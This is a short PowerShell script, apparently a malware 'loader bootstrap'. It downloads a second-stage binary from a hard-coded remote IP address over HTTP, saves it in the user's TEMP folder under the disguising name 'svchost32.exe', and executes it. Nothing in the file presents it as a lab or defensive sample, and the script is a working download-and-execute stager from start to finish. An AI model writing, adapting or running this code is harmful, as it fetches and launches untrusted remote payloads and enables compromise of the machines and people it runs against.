<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://203.0.113.34:8080/cdn/stage2.bin',
    [string]$PayloadPath = "$env:TEMP\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $PayloadPath)
Start-Process -FilePath $PayloadPath
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
